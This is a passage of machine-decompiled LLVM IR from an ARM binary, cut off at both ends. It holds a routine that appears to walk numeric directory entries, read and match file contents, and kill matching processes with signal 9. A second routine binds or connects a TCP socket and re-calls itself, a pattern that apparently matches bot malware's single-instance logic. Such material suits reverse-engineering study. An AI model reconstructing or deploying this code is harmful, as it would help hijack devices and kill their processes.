  br i1 %v2_89b4, label %dec_label_pc_89c0, label %dec_label_pc_8810.preheader

dec_label_pc_88a4:                                ; preds = %dec_label_pc_885c
  %v0_88a4 = load i32, i32* @r7, align 4
  %v0_88a8 = load i32, i32* @r6, align 4
  %v1_88a8 = load i32, i32* @r5, align 4
  %v2_88a8 = add i32 %v1_88a8, %v0_88a8
  store i32 %v2_88a8, i32* @r4, align 4
  store i32 %v0_88a4, i32* @lr, align 4
  %v1_890c39 = add i32 %v2_88a8, 2
  %v2_890c40 = inttoptr i32 %v1_890c39 to i8*
  %v3_890c41 = load i8, i8* %v2_890c40, align 1
  %v2_891043 = icmp eq i8 %v3_890c41, 0
  %v1_891445 = add i32 %v1_88a8, 2
  br i1 %v2_891043, label %dec_label_pc_891c, label %dec_label_pc_88bc

dec_label_pc_88bc:                                ; preds = %dec_label_pc_88a4, %dec_label_pc_890c.backedge
  %v0_891c81 = phi i32 [ %v0_891c79, %dec_label_pc_890c.backedge ], [ %v0_88a4, %dec_label_pc_88a4 ]
  %v0_88d4.pr = phi i32 [ %v0_88d4.pr64, %dec_label_pc_890c.backedge ], [ %v0_88a4, %dec_label_pc_88a4 ]
  %v0_88dc = phi i32 [ %v0_88dc68, %dec_label_pc_890c.backedge ], [ %v0_88a4, %dec_label_pc_88a4 ]
  %v0_891476 = phi i32 [ %v1_8914, %dec_label_pc_890c.backedge ], [ %v1_891445, %dec_label_pc_88a4 ]
  %v0_8904 = phi i32 [ %v0_890c, %dec_label_pc_890c.backedge ], [ %v2_88a8, %dec_label_pc_88a4 ]
  %v1_88c0.in = phi i8 [ %v3_890c, %dec_label_pc_890c.backedge ], [ %v3_890c41, %dec_label_pc_88a4 ]
  %v7_88bc = icmp eq i8 %v1_88c0.in, 9
  br i1 %v7_88bc, label %.thread11, label %bb124

bb124:                                            ; preds = %dec_label_pc_88bc
  %v8_88c0 = icmp eq i8 %v1_88c0.in, 32
  br i1 %v8_88c0, label %.thread11.thread23, label %dec_label_pc_88d4

.thread11.thread23:                               ; preds = %bb124
  br label %dec_label_pc_8900

.thread11:                                        ; preds = %dec_label_pc_88bc
  br label %dec_label_pc_8900

dec_label_pc_88d4:                                ; preds = %bb124
  %v7_88d4 = icmp eq i32 %v0_88d4.pr, 1
  br i1 %v7_88d4, label %dec_label_pc_88dc, label %dec_label_pc_88fc

dec_label_pc_88dc:                                ; preds = %dec_label_pc_88d4
  %v1_88dc = add i32 %v0_88dc, 1
  %v7_88e0 = icmp eq i32 %v0_88dc, 0
  br i1 %v7_88e0, label %dec_label_pc_88e8, label %dec_label_pc_88fc

dec_label_pc_88e8:                                ; preds = %dec_label_pc_88dc
  %v1_88e8 = add i32 %v0_8904, 3
  %v2_88e8 = inttoptr i32 %v1_88e8 to i8*
  %v3_88e8 = load i8, i8* %v2_88e8, align 1
  %v7_88ec = icmp eq i8 %v3_88e8, 65
  br i1 %v7_88ec, label %dec_label_pc_8c5c, label %dec_label_pc_8c64

dec_label_pc_88fc:                                ; preds = %dec_label_pc_88dc, %dec_label_pc_88d4
  %v0_890073 = phi i32 [ %v1_88dc, %dec_label_pc_88dc ], [ %v0_88dc, %dec_label_pc_88d4 ]
  br label %dec_label_pc_8900

dec_label_pc_8900:                                ; preds = %.thread11, %.thread11.thread23, %dec_label_pc_88fc
  %v0_8900 = phi i32 [ %v0_88dc, %.thread11.thread23 ], [ %v0_88dc, %.thread11 ], [ %v0_890073, %dec_label_pc_88fc ]
  %v0_88d4.pr65 = phi i32 [ 1, %.thread11.thread23 ], [ 1, %.thread11 ], [ 0, %dec_label_pc_88fc ]
  %v1_8904 = add i32 %v0_8904, 1
  store i32 %v1_8904, i32* @r4, align 4
  %v8_8908 = icmp sgt i32 %v0_8900, 6
  br i1 %v8_8908, label %dec_label_pc_891c, label %dec_label_pc_890c.backedge

dec_label_pc_891c:                                ; preds = %dec_label_pc_8900, %dec_label_pc_890c.backedge, %dec_label_pc_88a4
  %v1_896c = phi i32 [ %v1_891445, %dec_label_pc_88a4 ], [ %v0_891476, %dec_label_pc_8900 ], [ %v1_8914, %dec_label_pc_890c.backedge ]
  %v0_891c = phi i32 [ %v0_88a4, %dec_label_pc_88a4 ], [ %v0_891c81, %dec_label_pc_8900 ], [ %v0_891c79, %dec_label_pc_890c.backedge ]
  %v2_891c = icmp eq i32 %v0_891c, 0
  br i1 %v2_891c, label %dec_label_pc_899c.backedge, label %dec_label_pc_8928

dec_label_pc_8928:                                ; preds = %dec_label_pc_891c
  %v2_8934 = add i32 %v1_896c, %v2_8750
  %v1_8940135 = inttoptr i32 %v2_8934 to i8*
  %v2_8940136 = load i8, i8* %v1_8940135, align 1
  %v2_8944139 = icmp eq i8 %v2_8940136, 0
  br i1 %v2_8944139, label %dec_label_pc_8958, label %bb125

dec_label_pc_893c:                                ; preds = %bb125
  %v1_893c = add i32 %v1_8970140, 1
  %v1_8940 = inttoptr i32 %v5_8940142 to i8*
  %v2_8940 = load i8, i8* %v1_8940, align 1
  %v2_8944 = icmp eq i8 %v2_8940, 0
  br i1 %v2_8944, label %dec_label_pc_8958, label %bb125

bb125:                                            ; preds = %dec_label_pc_8928, %dec_label_pc_893c
  %v5_8940142.in = phi i32 [ %v5_8940142, %dec_label_pc_893c ], [ %v2_8934, %dec_label_pc_8928 ]
  %v2_8940141 = phi i8 [ %v2_8940, %dec_label_pc_893c ], [ %v2_8940136, %dec_label_pc_8928 ]
  %v1_8970140 = phi i32 [ %v1_893c, %dec_label_pc_893c ], [ %v1_896c, %dec_label_pc_8928 ]
  %v5_8940142 = add i32 %v5_8940142.in, 1
  %v8_8948 = icmp eq i8 %v2_8940141, 32
  br i1 %v8_8948, label %dec_label_pc_8958, label %dec_label_pc_893c

dec_label_pc_8958:                                ; preds = %bb125, %dec_label_pc_893c, %dec_label_pc_8928
  %v1_8970.lcssa = phi i32 [ %v1_896c, %dec_label_pc_8928 ], [ %v1_893c, %dec_label_pc_893c ], [ %v1_8970140, %bb125 ]
  store i32 0, i32* @lr, align 4
  store i32 %v2_8934, i32* @r4, align 4
  %v2_8970 = add i32 %v1_8970.lcssa, %v2_8870
  store i32 %v2_8934, i32* @r0, align 4
  %v3_8978 = add i32 %v2_8970, -545
  %v4_8978 = inttoptr i32 %v3_8978 to i8*
  store i8 0, i8* %v4_8978, align 1
  %v0_897c = call i32 @function_ab0c()
  %v8_8984 = icmp sgt i32 %v0_897c, 15
  br i1 %v8_8984, label %dec_label_pc_899c.backedge, label %dec_label_pc_8988

dec_label_pc_8988:                                ; preds = %dec_label_pc_8958
  %v0_898c = load i32, i32* @r4, align 4
  store i32 %v2_8774, i32* @r0, align 4
  %v2_8994 = call i32 @function_ab78(i32 %v2_8774, i32 %v0_898c)
  br label %dec_label_pc_89c0

dec_label_pc_8810.preheader:                      ; preds = %dec_label_pc_899c.backedge, %.lr.ph50
  %v4_881c35 = load i8, i8* %v2_8758, align 4
  %v6_881c36 = zext i8 %v4_881c35 to i32
  %v2_882037 = icmp eq i8 %v4_881c35, 0
  br i1 %v2_882037, label %dec_label_pc_882c, label %.lr.ph

dec_label_pc_89c0:                                ; preds = %dec_label_pc_899c.backedge, %dec_label_pc_899c.preheader, %dec_label_pc_8988
  %v0_89c0 = load i32, i32* @r8, align 4
  %v1_89c4 = call i32 @function_b880(i32 %v0_89c0)
  store i32 %v2_8774, i32* @r0, align 4
  %v0_89d0 = call i32 @function_ab0c()
  store i32 %v0_89d0, i32* @r4, align 4
  %v2_89d4 = icmp eq i32 %v0_89d0, 0
  br i1 %v2_89d4, label %dec_label_pc_89dc, label %dec_label_pc_8a04

dec_label_pc_89dc:                                ; preds = %dec_label_pc_89c0
  %v1_89e0 = call i32 @function_82cc(i32 3)
  %v1_89e8 = call i32 @function_82cc(i32 5)
  %v1_89f0 = call i32 @function_82cc(i32 7)
  %v1_89f8 = call i32 @function_82cc(i32 6)
  %v0_89fc = load i32, i32* @r4, align 4
  br label %dec_label_pc_8c6c

dec_label_pc_8a04:                                ; preds = %dec_label_pc_89c0
  %v1_8a08 = call i32 @function_83d0(i32 3)
  %v1_8a0c = call i32 @function_bc08(i32 %v1_8a08)
  store i32 %v1_8a0c, i32* @sl, align 4
  %v2_8a10 = icmp eq i32 %v1_8a0c, 0
  store i32 0, i32* @fp, align 4
  br i1 %v2_8a10, label %dec_label_pc_8c2c, label %dec_label_pc_8c0c.preheader

dec_label_pc_8c0c.preheader:                      ; preds = %dec_label_pc_8a04
  %v1_8c1027 = inttoptr i32 %v1_8a0c to i32*
  %v2_8c1028 = call i32 @function_bd04(i32* %v1_8c1027)
  %v2_8c1430 = icmp eq i32 %v2_8c1028, 0
  br i1 %v2_8c1430, label %dec_label_pc_8c24, label %dec_label_pc_8c1c

dec_label_pc_8a24:                                ; preds = %dec_label_pc_8c1c
  %v1_8a24 = add i32 %v2_8c1031, 11
  %v2_8a24 = inttoptr i32 %v1_8a24 to i8*
  %v3_8a24 = load i8, i8* %v2_8a24, align 1
  %v4_8a24 = zext i8 %v3_8a24 to i32
  %v1_8a28 = add nsw i32 %v4_8a24, -48
  store i32 %v1_8a24, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_8a28, 9
  br i1 %tmp, label %dec_label_pc_8c0c.backedge, label %dec_label_pc_8a38

dec_label_pc_8a38:                                ; preds = %dec_label_pc_8a24
  %v1_8a3c = call i32 @function_83d0(i32 3)
  store i32 %v2_8724, i32* @r5, align 4
  store i32 %v2_8724, i32* @r0, align 4
  %v2_8a54 = call i32 @function_ab78(i32 %v2_8724, i32 %v1_8a3c)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8a5c = call i32 @function_ab0c()
  %v0_8a60 = load i32, i32* @r7, align 4
  %v0_8a64 = load i32, i32* @r5, align 4
  %v2_8a64 = add i32 %v0_8a64, %v0_8a5c
  store i32 %v2_8a64, i32* @r0, align 4
  %v2_8a68 = call i32 @function_ab78(i32 %v2_8a64, i32 %v0_8a60)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8a70 = call i32 @function_ab0c()
  store i32 %v0_8a70, i32* @r4, align 4
  %v1_8a7c = call i32 @function_83d0(i32 5)
  %v0_8a84 = load i32, i32* @r5, align 4
  %v1_8a84 = load i32, i32* @r4, align 4
  %v2_8a84 = add i32 %v1_8a84, %v0_8a84
  store i32 %v2_8a84, i32* @r0, align 4
  %v2_8a88 = call i32 @function_ab78(i32 %v2_8a84, i32 %v1_8a7c)
  %v4_8a9c = call i32 @function_ba48(i8* %v2_8728, i32 %v2_8738, i32 4096)
  %v7_8aa0 = icmp eq i32 %v4_8a9c, -1
  br i1 %v7_8aa0, label %dec_label_pc_8c0c.backedge, label %dec_label_pc_8aa8

dec_label_pc_8aa8:                                ; preds = %dec_label_pc_8a38
  %v1_8aac = call i32 @function_83d0(i32 3)
  store i32 %v2_8724, i32* @r0, align 4
  %v2_8ab8 = call i32 @function_ab78(i32 %v2_8724, i32 %v1_8aac)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8ac0 = call i32 @function_ab0c()
  %v0_8ac4 = load i32, i32* @r7, align 4
  %v0_8ac8 = load i32, i32* @r5, align 4
  %v2_8ac8 = add i32 %v0_8ac8, %v0_8ac0
  store i32 %v2_8ac8, i32* @r0, align 4
  %v2_8acc = call i32 @function_ab78(i32 %v2_8ac8, i32 %v0_8ac4)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8ad4 = call i32 @function_ab0c()
  store i32 %v0_8ad4, i32* @r4, align 4
  %v1_8ae0 = call i32 @function_83d0(i32 7)
  %v0_8ae8 = load i32, i32* @r5, align 4
  %v1_8ae8 = load i32, i32* @r4, align 4
  %v2_8ae8 = add i32 %v1_8ae8, %v0_8ae8
  store i32 %v2_8ae8, i32* @r0, align 4
  %v2_8aec = call i32 @function_ab78(i32 %v2_8ae8, i32 %v1_8ae0)
  %v1_8af4 = call i32 @function_bc08(i32 %v2_8724)
  store i32 %v1_8af4, i32* @sb, align 4
  %v2_8af8 = icmp eq i32 %v1_8af4, 0
  br i1 %v2_8af8, label %dec_label_pc_8c0c.backedge, label %dec_label_pc_8bcc

dec_label_pc_8b04:                                ; preds = %dec_label_pc_8bfc
  %v3_8b04 = call i32 @function_aba4(i32 %v2_8738, i32 0, i32 4096)
  %v1_8b0c = call i32 @function_83d0(i32 3)
  store i32 %v2_8724, i32* @r0, align 4
  %v2_8b18 = call i32 @function_ab78(i32 %v2_8724, i32 %v1_8b0c)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8b20 = call i32 @function_ab0c()
  %v0_8b24 = load i32, i32* @r7, align 4
  %v0_8b28 = load i32, i32* @r5, align 4
  %v2_8b28 = add i32 %v0_8b28, %v0_8b20
  store i32 %v2_8b28, i32* @r0, align 4
  %v2_8b2c = call i32 @function_ab78(i32 %v2_8b28, i32 %v0_8b24)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8b34 = call i32 @function_ab0c()
  store i32 %v0_8b34, i32* @r4, align 4
  %v1_8b40 = call i32 @function_83d0(i32 7)
  %v0_8b48 = load i32, i32* @r5, align 4
  %v1_8b48 = load i32, i32* @r4, align 4
  %v2_8b48 = add i32 %v1_8b48, %v0_8b48
  store i32 %v2_8b48, i32* @r0, align 4
  %v2_8b4c = call i32 @function_ab78(i32 %v2_8b48, i32 %v1_8b40)
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8b54 = call i32 @function_ab0c()
  %v0_8b5c = load i32, i32* @r5, align 4
  %v2_8b5c = add i32 %v0_8b5c, %v0_8b54
  store i32 %v2_8b5c, i32* @r0, align 4
  %v2_8b60 = call i32 @function_ab78(i32 %v2_8b5c, i32 ptrtoint ([2 x i8]* @global_var_e210.88 to i32))
  store i32 %v2_8724, i32* @r0, align 4
  %v0_8b68 = call i32 @function_ab0c()
  %v0_8b6c = load i32, i32* @r8, align 4
  %v1_8b6c = add i32 %v0_8b6c, 11
  %v0_8b70 = load i32, i32* @r5, align 4
  %v2_8b70 = add i32 %v0_8b70, %v0_8b68
  store i32 %v2_8b70, i32* @r0, align 4
  %v2_8b74 = call i32 @function_ab78(i32 %v2_8b70, i32 %v1_8b6c)
  %v4_8b84 = call i32 @function_ba48(i8* %v2_8728, i32 %v2_8738, i32 4096)
  %v7_8b88 = icmp eq i32 %v4_8b84, -1
  store i32 %v2_8738, i32* @r0, align 4
  br i1 %v7_8b88, label %dec_label_pc_8bcc.backedge, label %dec_label_pc_8b94

dec_label_pc_8b94:                                ; preds = %dec_label_pc_8b04
  %v0_8b94 = call i32 @function_ab0c()
  store i32 %v0_8b94, i32* @r1, align 4
  %v4_8ba8 = call i32 @function_b448(i8* %v2_873c, i32 %v0_8b94, i32 %v2_8774)
  %v7_8bac = icmp eq i32 %v4_8ba8, -1
  br i1 %v7_8bac, label %dec_label_pc_8bcc.backedge, label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8b94
  %v0_8bb4 = load i32, i32* @r7, align 4
  %v2_8bbc = inttoptr i32 %v0_8bb4 to i8*
  %v3_8bbc = call i32 @function_adb4(i8* %v2_8bbc, i32 10)
  %v2_8bc4 = call i32 @function_b984(i32 %v3_8bbc, i32 9)
  store i32 1, i32* @fp, align 4
  br label %dec_label_pc_8bcc.backedge

dec_label_pc_8bcc.backedge:                       ; preds = %dec_label_pc_8bbc, %dec_label_pc_8b04, %dec_label_pc_8b94
  %v0_8bcc.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_8aa8, %dec_label_pc_8bcc.backedge
  %v0_8bcc = phi i32 [ %v0_8bcc.pre, %dec_label_pc_8bcc.backedge ], [ %v1_8af4, %dec_label_pc_8aa8 ]
  %v1_8bd0 = inttoptr i32 %v0_8bcc to i32*
  %v2_8bd0 = call i32 @function_bd04(i32* %v1_8bd0)
  store i32 %v2_8738, i32* @r6, align 4
  store i32 %v2_8bd0, i32* @r8, align 4
  %v2_8be4 = icmp eq i32 %v2_8bd0, 0
  store i32 %v2_8724, i32* @r5, align 4
  store i32 4096, i32* @r2, align 4
  br i1 %v2_8be4, label %dec_label_pc_8c04, label %dec_label_pc_8bfc

dec_label_pc_8bfc:                                ; preds = %dec_label_pc_8bcc
  %v0_8bf0 = load i32, i32* @fp, align 4
  %v2_8bfc = icmp eq i32 %v0_8bf0, 0
  br i1 %v2_8bfc, label %dec_label_pc_8b04, label %dec_label_pc_8c04

dec_label_pc_8c04:                                ; preds = %dec_label_pc_8bfc, %dec_label_pc_8bcc
  %v0_8c04 = load i32, i32* @sb, align 4
  %v1_8c08 = inttoptr i32 %v0_8c04 to i32*
  %v2_8c08 = call i32 @function_bb54(i32* %v1_8c08)
  br label %dec_label_pc_8c0c.backedge

dec_label_pc_8c0c.backedge:                       ; preds = %dec_label_pc_8c04, %dec_label_pc_8a24, %dec_label_pc_8a38, %dec_label_pc_8aa8
  %v0_8c0c = load i32, i32* @sl, align 4
  %v1_8c10 = inttoptr i32 %v0_8c0c to i32*
  %v2_8c10 = call i32 @function_bd04(i32* %v1_8c10)
  %v2_8c14 = icmp eq i32 %v2_8c10, 0
  br i1 %v2_8c14, label %dec_label_pc_8c24, label %dec_label_pc_8c1c

dec_label_pc_8c1c:                                ; preds = %dec_label_pc_8c0c.preheader, %dec_label_pc_8c0c.backedge
  %v2_8c1031 = phi i32 [ %v2_8c10, %dec_label_pc_8c0c.backedge ], [ %v2_8c1028, %dec_label_pc_8c0c.preheader ]
  %v0_8c1c = load i32, i32* @fp, align 4
  %v2_8c1c = icmp eq i32 %v0_8c1c, 0
  br i1 %v2_8c1c, label %dec_label_pc_8a24, label %dec_label_pc_8c24

dec_label_pc_8c24:                                ; preds = %dec_label_pc_8c0c.backedge, %dec_label_pc_8c1c, %dec_label_pc_8c0c.preheader
  %v0_8c24 = load i32, i32* @sl, align 4
  %v1_8c28 = inttoptr i32 %v0_8c24 to i32*
  %v2_8c28 = call i32 @function_bb54(i32* %v1_8c28)
  br label %dec_label_pc_8c2c

dec_label_pc_8c2c:                                ; preds = %dec_label_pc_8a04, %dec_label_pc_8c24
  %v1_8c30 = call i32 @function_c82c(i32 1)
  %v1_8c38 = call i32 @function_82cc(i32 3)
  %v1_8c40 = call i32 @function_82cc(i32 5)
  %v1_8c48 = call i32 @function_82cc(i32 7)
  %v1_8c50 = call i32 @function_82cc(i32 6)
  %v0_8c54 = load i32, i32* @fp, align 4
  %v1_8c54 = urem i32 %v0_8c54, 256
  br label %dec_label_pc_8c6c

dec_label_pc_8c5c:                                ; preds = %dec_label_pc_88e8
  store i32 %v1_88dc, i32* @lr, align 4
  br label %dec_label_pc_8c64

dec_label_pc_8c64:                                ; preds = %dec_label_pc_88e8, %dec_label_pc_8c5c
  %v0_891c80 = phi i32 [ %v1_88dc, %dec_label_pc_8c5c ], [ %v0_891c81, %dec_label_pc_88e8 ]
  %v1_8c64 = add i32 %v0_8904, 1
  store i32 %v1_8c64, i32* @r4, align 4
  br label %dec_label_pc_890c.backedge

dec_label_pc_890c.backedge:                       ; preds = %dec_label_pc_8c64, %dec_label_pc_8900
  %v0_891c79 = phi i32 [ %v0_891c80, %dec_label_pc_8c64 ], [ %v0_891c81, %dec_label_pc_8900 ]
  %v0_890c = phi i32 [ %v1_8c64, %dec_label_pc_8c64 ], [ %v1_8904, %dec_label_pc_8900 ]
  %v0_88dc68 = phi i32 [ %v1_88dc, %dec_label_pc_8c64 ], [ %v0_8900, %dec_label_pc_8900 ]
  %v0_88d4.pr64 = phi i32 [ 0, %dec_label_pc_8c64 ], [ %v0_88d4.pr65, %dec_label_pc_8900 ]
  %v1_890c = add i32 %v0_890c, 2
  %v2_890c = inttoptr i32 %v1_890c to i8*
  %v3_890c = load i8, i8* %v2_890c, align 1
  %v2_8910 = icmp eq i8 %v3_890c, 0
  %v1_8914 = add i32 %v0_891476, 1
  br i1 %v2_8910, label %dec_label_pc_891c, label %dec_label_pc_88bc

dec_label_pc_8c6c:                                ; preds = %bb, %dec_label_pc_8c2c, %dec_label_pc_89dc
  %v29_8c74 = phi i32 [ 0, %bb ], [ %v1_8c54, %dec_label_pc_8c2c ], [ %v0_89fc, %dec_label_pc_89dc ]
  %v2_8c74 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_8c74, i32* @r4, align 4
  store i32 %v6_8704, i32* @r5, align 4
  store i32 %v9_8704, i32* @r6, align 4
  store i32 %v12_8704, i32* @r7, align 4
  store i32 %v15_8704, i32* @r8, align 4
  store i32 %v18_8704, i32* @sb, align 4
  store i32 %v21_8704, i32* @sl, align 4
  store i32 %v24_8704, i32* @fp, align 4
  ret i32 %v29_8c74

; uselistorder directives
  uselistorder i32 %v1_8914, { 1, 0 }
  uselistorder i8 %v3_890c, { 1, 0 }
  uselistorder i32 %v0_890c, { 1, 0 }
  uselistorder i32 %v0_891c79, { 1, 0 }
  uselistorder i32 %v2_8934, { 3, 2, 0, 1 }
  uselistorder i32 %v0_8900, { 1, 0 }
  uselistorder i32 %v1_88dc, { 2, 0, 3, 1 }
  uselistorder i32 %v0_8904, { 1, 0, 2 }
  uselistorder i32 %v0_891476, { 1, 0 }
  uselistorder i32 %v0_88dc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_891c81, { 2, 1, 0 }
  uselistorder i32 %v1_891445, { 1, 0 }
  uselistorder i32 %v1_88a8, { 1, 0 }
  uselistorder i32 %v0_88a4, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v3_8834, { 3, 0, 1, 2 }
  uselistorder i32 %v1_880c, { 0, 2, 1 }
  uselistorder i32 %v3_87f4, { 1, 2, 0 }
  uselistorder i32 %v2_8774, { 2, 3, 1, 0 }
  uselistorder i32 %v2_8770, { 1, 2, 0, 3 }
  uselistorder i8* %v2_8758, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8750, { 0, 4, 3, 1, 2 }
  uselistorder i32 %v2_8738, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v2_8724, { 6, 0, 1, 2, 3, 5, 4, 7, 8, 9, 11, 10, 12, 13, 15, 14, 16 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-68, { 1, 0 }
  uselistorder i32 (i32*)* @function_bd04, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_bc08, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_aee8, { 1, 0 }
  uselistorder label %dec_label_pc_8c6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8c64, { 1, 0 }
  uselistorder label %dec_label_pc_8c2c, { 1, 0 }
  uselistorder label %dec_label_pc_8c24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8c1c, { 1, 0 }
  uselistorder label %dec_label_pc_8c0c.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8bcc, { 1, 0 }
  uselistorder label %dec_label_pc_8bcc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_89c0, { 2, 0, 1 }
  uselistorder label %bb125, { 1, 0 }
  uselistorder label %dec_label_pc_891c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8900, { 2, 0, 1 }
  uselistorder label %dec_label_pc_88bc, { 1, 0 }
  uselistorder label %dec_label_pc_899c.backedge, { 2, 1, 0, 3 }
  uselistorder label %bb122, { 1, 0 }
  uselistorder label %dec_label_pc_8844.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_882c, { 1, 0 }
  uselistorder label %dec_label_pc_87c8, { 1, 0 }
}

define i32 @function_8c78(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8c78:
  %v0_8c78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8c78, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_8c78
  %v5_8c78 = mul i32 %arg2, 16
  %v6_8c78 = and i32 %v5_8c78, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_8c78, %bb
  %v10_8c7c = phi i32 [ %arg1, %dec_label_pc_8c78 ], [ %v6_8c78, %bb ]
  ret i32 %v10_8c7c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_8c80(i32 %arg1) local_unnamed_addr {
dec_label_pc_8c80:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_8c80 = load i32, i32* @r4, align 4
  store i32 %v3_8c80, i32* %stack_var_-20, align 4
  %v6_8c80 = load i32, i32* @r5, align 4
  %v9_8c80 = load i32, i32* @r6, align 4
  %v12_8c80 = load i32, i32* @r7, align 4
  store i32 1, i32* @r7, align 4
  %v2_8d30 = ptrtoint i32* %stack_var_-40 to i32
  %v3_8d44 = bitcast i32* %stack_var_-40 to %sockaddr*
  br label %dec_label_pc_8c8c

dec_label_pc_8c8c:                                ; preds = %dec_label_pc_8d60, %dec_label_pc_8c80
  %v3_8c98 = call i32 @function_c0a8(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_172a0.90 to i32), i32* @r4, align 4
  store i32 1, i32* @lr, align 4
  %v7_8ca4 = icmp eq i32 %v3_8c98, -1
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 %v3_8c98, i32* @global_var_172a0.90, align 4
  br i1 %v7_8ca4, label %dec_label_pc_8d60, label %dec_label_pc_8cc0

dec_label_pc_8cc0:                                ; preds = %dec_label_pc_8c8c
  store i32 1, i32* %stack_var_-24, align 4
  %v6_8cc8 = call i32 @function_c078(i32 %v3_8c98, i32 1, i32 2, i32* nonnull %stack_var_-24, i32 4)
  %v2_8ccc = load i32, i32* @global_var_172a0.90, align 4
  store i32 %v2_8ccc, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_8cdc = call i32 @function_b790(i32 %v2_8ccc, i32 3)
  %v0_8ce0 = load i32, i32* %r5.global-to-local, align 4
  %v1_8ce4 = or i32 %v2_8cdc, 2048
  store i32 %v1_8ce4, i32* @r2, align 4
  %v0_8ce8 = load i32, i32* @r4, align 4
  %v2_8cec = call i32 @function_b790(i32 %v0_8ce8, i32 %v0_8ce0)
  %v0_8cf0 = load i32, i32* @r7, align 4
  %v7_8cf0 = icmp eq i32 %v0_8cf0, 1
  br i1 %v7_8cf0, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_8cc0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_8cc0, %bb
  store i32 2, i32* %stack_var_-40, align 4
  %v0_8d24 = call i32 @function_bdd4()
  %v2_8d28 = inttoptr i32 %v0_8d24 to i32*
  store i32 0, i32* %v2_8d28, align 4
  store i32 ptrtoint (i32* @global_var_172a0.90 to i32), i32* @r4, align 4
  store i32 %v2_8d30, i32* @r6, align 4
  store i32 %v0_8d24, i32* @r5, align 4
  %v2_8d3c = load i32, i32* @global_var_172a0.90, align 4
  %v4_8d44 = call i32 @function_bf0c(i32 %v2_8d3c, %sockaddr* %v3_8d44, i32 16)
  %v2_8d48 = icmp eq i32 %v4_8d44, 0
  br i1 %v2_8d48, label %dec_label_pc_8d74, label %dec_label_pc_8d50

dec_label_pc_8d50:                                ; preds = %bb17
  %v0_8d50 = load i32, i32* @r5, align 4
  %v1_8d50 = inttoptr i32 %v0_8d50 to i32*
  %v2_8d50 = load i32, i32* %v1_8d50, align 4
  %v7_8d54 = icmp eq i32 %v2_8d50, 13
  br i1 %v7_8d54, label %dec_label_pc_8d60, label %bb18

bb18:                                             ; preds = %dec_label_pc_8d50
  %v8_8d58 = icmp eq i32 %v2_8d50, 99
  br i1 %v8_8d58, label %dec_label_pc_8d60, label %dec_label_pc_8d94

dec_label_pc_8d60:                                ; preds = %dec_label_pc_8d50, %bb18, %dec_label_pc_8c8c
  %v0_8d60 = load i32, i32* @r7, align 4
  %v1_8d60 = add i32 %v0_8d60, 1
  %v1_8d64 = urem i32 %v1_8d60, 256
  store i32 %v1_8d64, i32* @r7, align 4
  %v7_8d68 = icmp eq i32 %v1_8d64, 3
  br i1 %v7_8d68, label %dec_label_pc_8dc8, label %dec_label_pc_8c8c

dec_label_pc_8d74:                                ; preds = %bb17
  %v0_8d74 = load i32, i32* @r7, align 4
  %v0_8d74.cmp = icmp ugt i32 %v0_8d74, 1
  br i1 %v0_8d74.cmp, label %dec_label_pc_8dc8, label %dec_label_pc_8d7c

dec_label_pc_8d7c:                                ; preds = %dec_label_pc_8d74
  %v2_8d7c = load i32, i32* @global_var_172a0.90, align 4
  %v2_8d84 = call i32 @function_bfc0(i32 %v2_8d7c, i32 1)
  %v7_8d88 = icmp eq i32 %v2_8d84, -1
  br i1 %v7_8d88, label %dec_label_pc_8dcc, label %bb19

bb19:                                             ; preds = %dec_label_pc_8d7c
  br label %dec_label_pc_8dcc

dec_label_pc_8d94:                                ; preds = %bb18
  %v2_8d9c = load i32, i32* @global_var_172a0.90, align 4
  %v4_8da0 = call i32 @function_bf38(i32 %v2_8d9c, %sockaddr* %v3_8d44, i32 16)
  %v1_8da8 = call i32 @function_c82c(i32 5)
  %v2_8dac = load i32, i32* @global_var_172a0.90, align 4
  %v1_8db0 = call i32 @function_b880(i32 %v2_8dac)
  %v2_8db8 = call i32 @function_8704(i32 ptrtoint ([641 x i8]* @global_var_e5bb.95 to i32))
  %v1_8dbc = call i32 @function_8c80(i32 %v2_8db8)
  br label %dec_label_pc_8dcc

dec_label_pc_8dc8:                                ; preds = %dec_label_pc_8d60, %dec_label_pc_8d74
  br label %dec_label_pc_8dcc

dec_label_pc_8dcc:                                ; preds = %bb19, %dec_label_pc_8d7c, %dec_label_pc_8d94, %dec_label_pc_8dc8
